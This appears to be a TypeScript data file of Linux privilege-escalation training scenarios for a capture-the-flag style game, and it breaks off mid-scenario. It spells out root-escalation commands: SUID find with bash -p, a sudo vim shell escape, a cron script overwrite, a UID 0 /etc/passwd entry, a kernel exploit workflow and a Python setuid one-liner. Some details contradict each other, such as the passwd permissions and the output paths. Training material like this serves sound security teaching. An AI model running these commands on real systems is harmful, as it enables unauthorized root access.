import type { PrivescScenario } from './types';

export const PRIVESC_SCENARIOS: PrivescScenario[] = [
  {
    id: 'privesc-001',
    title: 'SUID Find',
    description:
      'You have a low-privilege shell on a Linux server. A routine audit reveals that common utilities may have been misconfigured. Explore the filesystem to find a way to escalate to root and capture the flag stored in /root/flag.txt.',
    technique: 'SUID Binary',
    difficulty: 'beginner',
    villain: {
      name: 'Dr. Elena Vasquez',
      alias: 'The Architect of Chaos',
      description: 'A rogue sysadmin who deliberately weakened server security to create backdoors for her hacking group.',
    },
    hints: [
      'Run: find / -perm -4000 -type f 2>/dev/null',
      'The find binary has the SUID bit set, it can execute commands as the file owner.',
      'GNU find supports the -exec flag. Combine it with /bin/bash to spawn a root shell.',
    ],
    story: {
      title: 'The SUID Breach: Valkyrie\'s Welcome',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Routine Reconnaissance',
          narrative: `> **Valkyrie:** "We have a low-privilege shell on this staging server. Before we do anything dangerous, let's map out our surroundings. Every good hack starts with recon."

Dr. Elena Vasquez: The Architect of Chaos, was NovaCorp's lead sysadmin. She deliberately weakened security to create backdoors for her hacking group. Let's trace her steps.

Start by listing files and checking where you are. The filesystem tells the story if you know how to read it. On any Linux host the first three commands are the same: \`id\` (who am I and what groups do I belong to), \`pwd\` (where am I), and \`ls -la\` (what is here). Privilege escalation almost always starts by discovering something the sysadmin left readable, writable, or executable that shouldn't be.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'command', value: 'pwd' }],
          hint: 'Start by exploring your surroundings with ls -la',
        },
        {
          id: 'ch2-finding',
          title: 'Chapter 2: The Rogue Binary',
          narrative: `> **Valkyrie:** "Good recon. Now let's dig deeper. The admin notes mention a tool called 'find' with SUID permissions."

**SUID (Set User ID)** is a special permission bit. When a binary has SUID set, it runs with the privileges of the **file owner** — not the user who executed it. That's why the standard \`passwd\` command can modify the root-owned shadow file: it runs as root even when a normal user invokes it.

Dr. Vasquez was clever, she used a legitimate tool as her backdoor. SUID binaries are dangerous when misconfigured, because they hand an unprivileged user a way to run code as root. If \`find\` has the SUID bit set and is owned by root, any command we pass to it, including one we choose, executes as root.

## Finding SUID Binaries

The command \`find / -perm -4000 -type f 2>/dev/null\` walks the entire filesystem and lists every file with mode 4000 (the SUID bit). In the results, SUID files show up with an \`s\` in the owner-execute position: \`-rwsr-xr-x\`. Spotting a **non-standard** binary like \`find\` in that list is a red flag the moment you see it.

## Why find Specifically?

GNU find supports the \`-exec\` flag, which runs an arbitrary command for each match. Combined with SUID, that means \`find\` becomes a root command launcher. That's the vulnerability.`,
          triggers: [{ type: 'command', value: 'find' }, { type: 'output_contains', value: '4755' }],
          hint: 'Search for SUID binaries: find / -perm -4000 -type f 2>/dev/null',
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: Exploitation',
          narrative: `> **Valkyrie:** "Bingo! find has the SUID bit set (mode 4755). Here's the exploit chain:"

\`\`\`
find /tmp -exec /bin/bash -p \\;
\`\`\`

The \`find\` binary runs as root (because of SUID), so the \`-exec\` it performs executes as root too. We ask find to run \`/bin/bash -p\`, the \`-p\` flag tells bash to keep the privileged (root) UID instead of dropping it as it normally would. The result is an interactive root shell.

Dr. Vasquez thought she was clever with this backdoor. But we've turned her own weapon against her.

## Why -p Matters

Bash is designed to be safe: when it detects it's running with a real UID that differs from the effective UID (a classic SUID situation), it *drops* privileges unless invoked with \`-p\`. Without \`-p\`, the root shell quietly demotes itself back to our user. That flag is the difference between a root shell and a shell that looks like root but isn't.

## Next Step

Once you have the root shell, read the flag at \`/root/flag.txt\`, that's our objective complete."`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Use find with -exec to spawn a root shell: find /tmp -exec /bin/bash -p \\;',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\napt:x:100:65534::/nonexistent:/usr/sbin/nologin\ntrainee:x:1000:1000:trainee:/home/trainee:/bin/bash',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/trainee/.bash_history': 'ls -la\nwhoami\nfind / -perm -4000 -type f 2>/dev/null',
      '/home/trainee/notes.txt':
        '# System Notes\n- The sysadmin installed find with SUID for recursive audits\n- /root/flag.txt contains today\'s flag\n- Do NOT share root credentials',
      '/usr/bin/find': '[SUID binary, owned by root, mode 4755]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'find / -perm -4000 -type f 2>/dev/null',
      'find /tmp -exec /bin/bash -p \\;',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-002',
    title: 'Sudo Vim Escape',
    description:
      'You are logged in as the user "analyst". Running sudo -l reveals that your user can run vim as root without a password. Exploit this misconfiguration to read the root flag.',
    technique: 'Sudo Misconfiguration',
    difficulty: 'beginner',
    hints: [
      'Check your sudo permissions with: sudo -l',
      'Vim can execute shell commands when run with elevated privileges.',
      'From vim, run :!cat /root/flag.txt or :!bash to spawn a root shell.',
    ],
    story: {
      title: 'The Vim Trap: Breaking the Cage',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: What Can I Do?',
          narrative: `You're logged in as 'analyst'. First rule of privesc: know your limits.

## Know What You Can Run as Root

The \`sudo -l\` command lists every command your user is allowed to run through sudo, along with any authentication requirements. The sudoers file controls all of this, it's the rulebook that says "who can run what, as whom, with or without a password."

If you can run ANY program as root without a password, that program becomes your escape hatch. Any binary you can invoke as root can: directly or indirectly, execute arbitrary commands with root privileges. The misconfiguration isn't always obvious: editors, pagers, and scripting interpreters are the classic culprits because they all have "run a shell command" features built in.`,
          triggers: [{ type: 'command', value: 'sudo -l' }],
          hint: 'Check sudo permissions with sudo -l',
        },
        {
          id: 'ch2-discovery',
          title: 'Chapter 2: The Vim Door',
          narrative: `> **Valkyrie:** "Excellent. The sudo rules say: analyst can run vim as root (NOPASSWD). This is a critical misconfiguration."

## Why vim Is Dangerous as Root

Vim is a text editor with a built-in shell escape. The \`:!\` command runs any shell command, and when vim itself is running as root, that shell command runs as root too. A "restricted" editor is therefore equivalent to a root shell with extra steps.

This is not unique to vim: \`nano\`, \`less\`, \`man\`, \`more\`, and \`awk\`/\`perl\`/\`python\` all have similar escape mechanisms. The security rule is absolute: never grant users sudo access to any program that can spawn a shell. The \`NOPASSWD\` part makes it worse, no password prompt means our escape is frictionless.

## The Exploit Path

\`sudo vim\` opens the editor as root. Inside vim, \`:!command\` executes \`command\` as root. That single feature turns a text editor into a privilege escalation primitive.`,
          triggers: [{ type: 'command', value: 'vim' }],
          hint: 'Run vim with sudo: sudo vim',
        },
        {
          id: 'ch3-escape',
          title: 'Chapter 3: Breaking Out',
          narrative: `> **Valkyrie:** "Vim is running with root privileges. Now break out of the cage."

## The Escape Sequence

1. Open vim with sudo: \`sudo vim\`, the editor now runs as root.
2. Enter command mode with \`:\`.
3. Run \`:!cat /root/flag.txt\`, executes as root, reading the flag directly.
4. Or go further with \`:!bash\`, spawns a full interactive root shell.

The \`:!\` prefix tells vim "run the following as a shell command." Since vim's effective UID is root, everything it spawns inherits root privileges.

## Think of vim as a Trojan Horse

It looks innocent, an editor. But it hides a root shell inside. In real engagements, every sudo entry in the sudoers file gets interrogated for exactly this kind of escape: can the allowed binary run a shell, read a file, or modify a script that runs as root? If yes, the "safe" sudo rule is a privilege escalation waiting to happen.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'From vim, run :!cat /root/flag.txt to read the flag',
        },
      ],
    },
    filesystem: {
      '/etc/sudoers':
        'root\tALL=(ALL:ALL) ALL\nanalyst\tALL=(root) NOPASSWD: /usr/bin/vim\n',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1001:1001::/home/analyst:/bin/bash',
      '/home/analyst/.bash_history': 'sudo vim /etc/nginx/nginx.conf',
      '/home/analyst/README.txt':
        '# Analyst Workstation\n- You have sudo access to vim for editing configs\n- Flag is in /root/flag.txt\n- Contact admin if you need additional access',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'sudo -l',
      'sudo vim -c ":!cat /root/flag.txt"',
    ],
  },
  {
    id: 'privesc-003',
    title: 'Cron Job Hijack',
    description:
      'A legacy server runs a cleanup script every minute via cron. The script is world-writable. Exploit this to escalate privileges and read the root flag.',
    technique: 'Cron Job Abuse',
    difficulty: 'intermediate',
    hints: [
      'Examine /etc/crontab and /etc/cron.d/ for scheduled tasks.',
      'The cleanup script at /opt/cleanup.sh is owned by root but writable by everyone.',
      'Overwrite the script with a reverse shell or a command that reads the flag, then wait for cron to execute it.',
    ],
    story: {
      title: 'The Silent Chronometer: Hijacking Time',
      chapters: [
        {
          id: 'ch1-recon',
          title: 'Chapter 1: Scheduled Tasks',
          narrative: `> **Valkyrie:** "This is an old legacy server. Cron jobs run tasks on schedules, often as root. Let's inspect the system scheduler."

## How Cron Works

Cron is the Linux task scheduler. The \`/etc/crontab\` file (and \`/etc/cron.d/\`, plus per-user crontabs) defines what runs and when. The killer detail: cron jobs frequently run as **root** because they were set up by administrators who needed the privileges, and nobody ever reviewed them again.

## Reading the Cron Format

\`cat /etc/crontab\` shows every scheduled task with its five time fields:

\`\`\`
* * * * *   root   command-to-run
┌───────── minute (0-59)
│ ┌─────── hour (0-23)
│ │ ┌───── day of month (1-31)
│ │ │ ┌─── month (1-12)
│ │ │ │ ┌─ day of week (0-7)
│ │ │ │ │
* * * * * command
\`\`\`

## Spotting the Vulnerability

The attack question is simple: **does any scheduled task run a script or binary that an unprivileged user can write to?** If a root cron job executes a world-writable script, we can replace that script with our own payload and wait, cron will run it as root for us. The scheduler does the privilege escalation; we just provide the content.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'crontab' }],
          hint: 'Check scheduled tasks: cat /etc/crontab',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Writable Script',
          narrative: `> **Valkyrie:** "Found it! A cleanup script at /opt/cleanup.sh runs as root every minute, and it's world-writable."

## Why World-Writable Means Owned

\`ls -la /opt/cleanup.sh\` shows the real permissions. A script showing \`-rwxrwxrwx\` is writable by **everyone**, meaning any user can replace its contents. When cron executes it as root, cron runs *our* content as root. The script being owned by root doesn't help; what matters is who can write to it.

## Attack Plan

1. Overwrite \`/opt/cleanup.sh\` with our payload.
2. Payload: \`cat /root/flag.txt > /tmp/flag_output.txt\`, copies the flag to a file we can read.
3. Wait for cron to execute it as root (runs every minute).
4. Read the flag from the output file.

This works because the **execution identity** (root, from cron) and the **file ownership** (who wrote the content) are completely different things. The cron job trusts a script it doesn't control.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'cleanup' }],
          hint: 'Check script permissions: ls -la /opt/cleanup.sh',
        },
        {
          id: 'ch3-exploitation',
          title: 'Chapter 3: Patience is a Virtue',
          narrative: `> **Valkyrie:** "Inject the payload into the cleanup script. We're planting a seed and waiting for the cron to water it."

## Writing the Payload

\`\`\`
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cat /root/flag.txt > /tmp/flag_output.txt' >> /opt/cleanup.sh
chmod +x /opt/cleanup.sh
\`\`\`

The first line makes it a valid bash script. The second line replaces the original cleanup logic with our exfiltration command, the flag's contents get copied to \`/tmp/flag_output.txt\`, which our low-privilege user CAN read. The \`chmod +x\` keeps it executable so cron runs it without complaint.

## Why Redirect to a Readable File

If we tried to \`cat /root/flag.txt\` directly in our shell, we'd get permission denied, root's home directory and the flag are mode 600/700, readable only by root. The trick is letting cron (running as root) do the reading and deposit the result somewhere our user can access. \`/tmp\` is world-readable, so once the flag lands there, it's ours.

## Timing

The cron job fires every 60 seconds, so the injection is a waiting game. One minute later, the flag appears.`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'command', value: 'chmod' }],
          hint: 'Overwrite the script: echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: The Harvest',
          narrative: `> **Valkyrie:** "The cron job executed your script as root. The flag is now in the output file. Harvest it!"

## Harvest the Flag

\`cat /tmp/flag_output.txt\`, the flag lands in the file within one cron cycle.

## Why This Works (and Why It's Everywhere)

This is a classic **cron hijack**: the administrator trusted a script that anyone could modify. Cron executes with the privileges listed in the crontab entry, in this case root, so the trust is complete. The mistake is that the file's *write* permissions contradict the *execute* trust: root executes a script that ordinary users can edit.

In real pentests, this is one of the most common privesc vectors, and it generalizes: any root-scheduled script, service, or binary that a low-privilege user can modify is a privilege escalation, whether via cron, systemd timers, or init scripts.`,
          triggers: [{ type: 'file_access', value: '/home/dev/flag_output.txt' }],
          hint: 'After waiting a minute, check: cat /home/dev/flag_output.txt',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n* * * * * root\t/opt/cleanup.sh',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1002:1002::/home/dev:/bin/bash',
      '/opt/cleanup.sh':
        '#!/bin/bash\n# Scheduled cleanup, runs every minute\n# Last modified by deploy bot 2025-11-03\nLOGDIR=/var/log/tmp\nmkdir -p $LOGDIR\nfind /tmp -type f -mtime +1 -delete\nfind /var/tmp -type f -mtime +1 -delete\necho "[$(date)] Cleanup complete" >> /var/log/cleanup.log',
      '/home/dev/notes.txt':
        '# Dev Notes\n- The cleanup script runs as root every minute\n- You can write to /opt/cleanup.sh\n- /root/flag.txt is the target\n- Make sure your payload writes to a location you can read',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/crontab',
      'ls -la /opt/cleanup.sh',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
      'chmod +x /opt/cleanup.sh',
      'sleep 65',
      'cat /home/dev/flag_output.txt',
    ],
  },
  {
    id: 'privesc-004',
    title: 'Writable passwd',
    description:
      'You discover that /etc/passwd is world-writable, a critical misconfiguration. Craft a password entry for a new user with root-level UID and escalate to root.',
    technique: 'Writable /etc/passwd',
    difficulty: 'intermediate',
    hints: [
      'Check file permissions: ls -la /etc/passwd',
      'You can add a new entry to /etc/passwd with UID 0, it will be treated as root.',
      'Generate a password hash with: openssl passwd -1 -salt abc newpass',
    ],
    story: {
      title: 'The Golden Key: Overwriting Identity',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Permissive Permissions',
          narrative: `> **Valkyrie:** "Let's check the permissions on /etc/passwd, the system's user database."

## Why /etc/passwd Permissions Matter

\`/etc/passwd\` is the system's user database. It should be owned by root and writable only by root. If it's **world-writable**, anyone can add a user, and that's a privilege escalation.

## The /etc/passwd Format

\`\`\`
username:password_hash:UID:GID:comment:home:shell
\`\`\`

The fields are: username, password hash (an \`x\` means "hash is in /etc/shadow"), **UID**, **GID**, comment, home directory, and login shell.

## The Critical Field: UID

The operating system doesn't track "who is admin" by name, it tracks the numeric **UID**. UID 0 is root. UID 1000+ is a regular user. If we add an entry with UID 0, the system treats that user as root for every permission check. The name in the first field is cosmetic; the UID is everything.

## Why the Hash Goes Here

On modern systems the hash normally lives in \`/etc/shadow\` (that's what the \`x\` means). But if we put a real hash directly in the \`/etc/passwd\` field, login will use it. We generate one with \`openssl passwd\` so we know the password.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'passwd' }],
          hint: 'Check permissions: ls -la /etc/passwd',
        },
        {
          id: 'ch2-planning',
          title: 'Chapter 2: Crafting the Entry',
          narrative: `> **Valkyrie:** "The file is writable. Now we need a password hash for our new root user."

## Generating a Hash

\`\`\`
openssl passwd -1 -salt xyz newpass
\`\`\`

Output looks like: \`$1$xyz$<hash>\`

This produces an MD5-crypt hash (\`$1$\`) of the password \`newpass\` using the salt \`xyz\`.

## Why Salt?

A salt is random data mixed into the password before hashing. It ensures that two users with the same password get different hashes, and it defeats **rainbow tables**, precomputed password-to-hash lookup tables. If an attacker has the hash but not the salt, a rainbow table is useless because the salt changes the hash.

## Why We Care

Here we control both salt and password, so we're not cracking anything, we're *generating* a known hash for our malicious user entry. Any hash will do; what matters is that \`su pwned\` will prompt for a password and verify it against this hash. Since we chose \`newpass\`, we know the answer.`,
          triggers: [{ type: 'command', value: 'openssl' }, { type: 'output_contains', value: '$1$' }],
          hint: 'Generate password hash: openssl passwd -1 -salt xyz newpass',
        },
        {
          id: 'ch3-injection',
          title: 'Chapter 3: The Injection',
          narrative: `> **Valkyrie:** "Time to inject. We're adding user 'pwned' with UID 0 (root) to /etc/passwd."

## The Injection

\`\`\`
echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd
\`\`\`

## Field-by-Field Breakdown

| Field | Value | Meaning |
|-------|-------|---------|
| pwned | username | our malicious account name |
| $1$xyz$<hash> | password hash | lets us authenticate as pwned |
| 0 | UID | **root**, the whole point |
| 0 | GID | root's primary group |
| (empty) | comment | unused field |
| /root | home dir | maps the user to root's home |
| /bin/bash | shell | interactive login shell |

## Why This Works

When \`su pwned\` runs, the login system reads this entry, sees UID 0, and grants root privileges after the password check succeeds. The append (\`>>\`) preserves all existing users while adding ours. The system has no idea "pwned" isn't a legitimate root account, by every permission check, it is one.`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'output_contains', value: '/etc/passwd' }],
          hint: 'Add user: echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: Becoming Root',
          narrative: `> **Valkyrie:** "The trap is set. Switch to the 'pwned' user and claim your prize."

## Becoming Root

\`\`\`
su pwned
cat /root/flag.txt
\`\`\`

\`su\` (switch user) authenticates against the hash we placed in /etc/passwd, then starts a shell with the new user's UID: which is 0. We just turned a writable file into root access.

## Why /etc/passwd Permissions Are Sacred

This attack requires exactly one misconfiguration: the file being writable by non-root users. On any properly configured system, \`/etc/passwd\` is \`-rw-r--r--\` (only root can write) and the hashes live in \`/etc/shadow\`, which is root-only readable. File permission mistakes like this are why the /etc/passwd permissions are considered sacred, one chmod slip can hand an attacker a root account.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Switch user: su pwned, then cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\noperator:x:37:37::/root:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
      '/etc/passwd.perm': '-rw-r--r-- 1 root root 1847 Nov  3 10:00 /etc/passwd',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/ubuntu/.bash_history': 'ls -la /etc/passwd\nfind / -writable -type f 2>/dev/null',
      '/home/ubuntu/hint.txt':
        '# Recon Complete\n- /etc/passwd is world-writable!\n- You can add a user with UID 0 to gain root\n- Generate a password hash: openssl passwd -1 -salt xyz newpass\n- Then add the line to /etc/passwd\n- The flag is in /root/flag.txt',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /etc/passwd',
      'openssl passwd -1 -salt xyz newpass',
      'echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
      'su pwned',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-005',
    title: 'Dirty Kernel',
    description:
      'The server runs an unpatched Linux kernel with a known privilege escalation CVE. Research the kernel version and compile an exploit to gain root access.',
    technique: 'Kernel Exploit',
    difficulty: 'advanced',
    hints: [
      'Run uname -a to identify the kernel version.',
      'Linux kernel 3.13.0 is vulnerable to CVE-2015-1328 (overlayfs local privilege escalation).',
      'Search for a public exploit, compile it with gcc, and execute it to spawn a root shell.',
    ],
    story: {
      title: 'The Unpatched Leviathan: Exploiting the Core',
      chapters: [
        {
          id: 'ch1-version',
          title: 'Chapter 1: The Version Check',
          narrative: `> **Valkyrie:** "This server is running an ancient kernel. Let's check what we're dealing with."

## Identify the Kernel

\`uname -a\` prints the full kernel version, including the exact build number and patch level. That single line tells us everything we need: the kernel is the heart of the OS, and if it's unpatched, it may have a known CVE that hands us root.

## The Kernel Exploit Mindset

Kernel exploits are the bluntest privesc weapon: rather than abusing a misconfigured file or service, we exploit a bug in the OS itself. The workflow is mechanical:

\`\`\`
[Identify Version] --> [Research CVE] --> [Compile Exploit] --> [root]
\`\`\`

1. **Identify** the exact kernel version.
2. **Research**: a version like 3.13.0 is old enough to have documented, publicly disclosed vulnerabilities (CVEs).
3. **Compile** a public exploit for the matching bug.
4. **Detonate** it and get root.

The catch: kernel exploits must match the exact vulnerable version, and a wrong exploit won't just fail, it can crash the host (kernel panic). So version identification is not optional; it's the step that keeps the attack from destroying the target.`,
          triggers: [{ type: 'command', value: 'uname' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check kernel version: uname -a',
        },
        {
          id: 'ch2-research',
          title: 'Chapter 2: The Vulnerability',
          narrative: `> **Valkyrie:** "Kernel 3.13.0, this is vulnerable to CVE-2015-1328 (OverlayFS local privilege escalation)."

## CVE-2015-1328 at a Glance

| Property | Detail |
|----------|--------|
| Affects | Linux kernels 3.13.x through 3.19.x |
| Type | Local privilege escalation |
| Impact | Unprivileged user to root |
| Root cause | OverlayFS inode copy-up race condition |
| Fix | Patched in kernel 3.19.0-21 |

## The Vulnerability

CVE-2015-1328 is a race condition in the OverlayFS filesystem driver. OverlayFS lets you stack directories on top of each other; when a file gets "copied up" between layers, a race window appears where an attacker can substitute a file. Exploiting the race lets an unprivileged process escalate to root. Public exploit code for this CVE has been available since 2015, which is why the fix deadline matters.

## The Lesson

This vulnerability was **publicly disclosed in 2015**. Every system that patched became immune; every system that didn't stayed exposed for years. Let's verify the exact OS version (\`cat /etc/os-release\`) and prepare to compile the exploit, matching the version is what makes the attack reliable.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check OS details: cat /etc/os-release',
        },
        {
          id: 'ch3-compilation',
          title: 'Chapter 3: Building the Weapon',
          narrative: `> **Valkyrie:** "GCC is installed. Time to compile the exploit."

## Compiling an Exploit

\`\`\`
gcc exploit.c -o exploit
\`\`\`

\`gcc\` transforms human-readable C source into a machine-code binary. Public exploit code for CVE-2015-1328 is available (e.g., via exploit-db), and this box conveniently has gcc installed, not a coincidence; attackers check for a compiler exactly like this.

## What the Exploit Does

1. **Creates a fake OverlayFS mount**: constructs the layered filesystem the bug needs.
2. **Triggers the race condition**: in the copy-up logic between overlay layers.
3. **Escalates to root**: the winning race gives an unprivileged process root privileges via the kernel bug.

## Why Compiling Locally Matters

Compiling on the target avoids carrying a binary across the network and ensures compatibility with the exact kernel headers. If gcc weren't present, we'd have to cross-compile on our own machine or use a static binary, which is why gcc's presence on a target is a real asset to an attacker.`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'output_contains', value: 'exploit' }],
          hint: 'Compile the exploit: gcc exploit.c -o exploit',
        },
        {
          id: 'ch4-detonation',
          title: 'Chapter 4: Detonation',
          narrative: `> **Valkyrie:** "The weapon is ready. Execute it."

## Detonation

\`\`\`
./exploit
\`\`\`

The exploit runs, triggers CVE-2015-1328, and spawns a root shell.

## The Moment of Truth

Kernel exploits are **binary**: they either win the race and you're root, or they lose and the process crashes. A poorly-matched exploit doesn't just fail gracefully, a kernel panic can take down the entire host, destroying the target and our access with it.

That's why every step before this mattered: the version check kept the exploit matched to the vulnerable kernel, and the compile ensured the binary works on this exact architecture. If it succeeds, you'll see the prompt change to \`root@server:~#\`. If it crashes, the box is done, which is exactly why kernel exploits are a last resort when misconfiguration attacks are exhausted.`,
          triggers: [{ type: 'command', value: './exploit' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./exploit',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Crown Jewels',
          narrative: `> **Valkyrie:** "We have root! The kernel couldn't protect itself from a known vulnerability."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Core Lesson: Patch Management

CVE-2015-1328 was **publicly disclosed in 2015**, a decade before this box was deployed. Every administrator who ran the vendor's security update became immune. This server's administrator didn't, and a public exploit, a compiler, and one race condition later, the whole machine was ours.

Vulnerability disclosure is a clock: the moment a CVE goes public, attackers have the same exploit code the researchers published. The window between disclosure and patching is exactly when breaches happen. Keeping kernels (and every package) patched is not optional maintenance, it's the single most effective defense against whole-class privesc attacks like this one.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/proc/version':
        'Linux server01 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux',
      '/etc/os-release':
        'NAME="Ubuntu"\nVERSION="14.04.6 LTS, Trusty Tahr"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 14.04.6 LTS"',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\noperator:x:37:37::/root:/usr/sbin/nologin\ndev:x:1000:1000::/home/dev:/bin/bash',
      '/home/dev/.bash_history': 'uname -a\ncat /etc/os-release',
      '/home/dev/readme.txt':
        '# Security Audit Notes\n- Kernel is 3.13.0-24-generic. UNPATCHED\n- This version is vulnerable to CVE-2015-1328 (overlayfs)\n- gcc is installed at /usr/bin/gcc\n- Public exploits available on exploit-db\n- /root/flag.txt is the target',
      '/usr/bin/gcc': '[available, gcc 4.8.4]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'uname -a',
      'cat /etc/os-release',
      'gcc exploit.c -o exploit',
      './exploit',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-006',
    title: 'Cap Setuid Python',
    description:
      'The sysadmin granted python3 the cap_setuid capability for a deployment script. Exploit this capability to elevate to root.',
    technique: 'Capabilities',
    difficulty: 'intermediate',
    hints: [
      'Check capabilities with: getcap -r / 2>/dev/null',
      'Python3 has cap_setuid=ep, this allows it to change its effective UID.',
      'Use Python to set uid to 0 and spawn a shell.',
    ],
    story: {
      title: 'The Hidden Overlord: Capability Abuse',
      chapters: [
        {
          id: 'ch1-capabilities',
          title: 'Chapter 1: What Has Elevated Powers?',
          narrative: `> **Valkyrie:** "Linux capabilities are like mini-superpowers assigned to specific binaries. Let's scan for them."

## What Are Capabilities?

Modern Linux replaced the crude all-or-nothing "root" privilege with **capabilities**, fine-grained permissions that can be granted to individual binaries without making the whole process root. They're a security improvement, but only if they're granted carefully.

## Common Dangerous Capabilities

| Capability | Effect |
|-----------|--------|
| cap_setuid | change user ID: **can become root** |
| cap_net_raw | sniff network traffic |
| cap_sys_admin | full system administration |
| cap_dac_override | bypass all file permission checks |

## The Scan

\`getcap -r / 2>/dev/null\` recursively lists every binary with capabilities set. The output format is \`path cap_name=flags\`.

The key realization: if any binary has \`cap_setuid\`, it can elevate to root, **even without a SUID bit**. Capabilities and SUID are two different mechanisms that lead to the same place: a binary that runs with more privilege than the user who invoked it.`,
          triggers: [{ type: 'command', value: 'getcap' }],
          hint: 'Scan for capabilities: getcap -r / 2>/dev/null',
        },
        {
          id: 'ch2-python',
          title: 'Chapter 2: The Python Backdoor',
          narrative: `> **Valkyrie:** "Python3 has cap_setuid=ep. The sysadmin granted this for a deployment script, but it's our golden ticket."

## Reading the Capability

\`\`\`
getcap /usr/bin/python3.4
# Output: /usr/bin/python3.4 cap_setuid=ep
\`\`\`

## Decoding the Flags

The \`=ep\` suffix means:

- **e** (effective), the capability is currently active while the binary runs.
- **p** (permitted), the capability is allowed and can be activated.

Together, \`cap_setuid=ep\` means the binary can change its effective user ID **at will**, including to 0. The sysadmin granted this so a deployment script could drop/raise privileges during installs. The intent was harmless; the effect is that Python can become root on demand.

## Why Interpreters Are the Worst Hosts for Capabilities

A SUID or capability-augmented *interpreter* is worse than an augmented binary, because the interpreter executes whatever code we feed it. A C binary with cap_setuid is limited to its own code; python3 with cap_setuid runs *our* code with that same capability. One flag on an interpreter turns a whole scripting language into a privilege escalation tool.`,
          triggers: [{ type: 'command', value: 'python' }, { type: 'output_contains', value: 'cap_setuid' }],
          hint: 'Check python capabilities: getcap /usr/bin/python3.4',
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: One Line to Rule Them All',
          narrative: `> **Valkyrie:** "A single Python line is all it takes."

## The One-Liner

\`\`\`
python3.4 -c "import os; os.setuid(0); os.system('/bin/bash')"
\`\`\`

## Breaking It Down

| Code | What it does |
|------|--------------|
| import os | load Python's OS interaction module |
| os.setuid(0) | change effective UID to **root** (0) |
| os.system('/bin/bash') | spawn an interactive shell, as root |

## Why This Works

The capability is what makes \`setuid(0)\` legal. Without \`cap_setuid\`, Python calling \`setuid(0)\` would fail with \`Operation not permitted\`, an unprivileged process cannot elevate itself. But because the *binary* carries the capability, the kernel permits the call, the process becomes root, and the shell it spawns inherits that root identity.

This is the cleanest privesc possible: one line, no compilation, no race condition. The capability grants Python the right to call setuid(0), and setuid(0) makes you root.`,
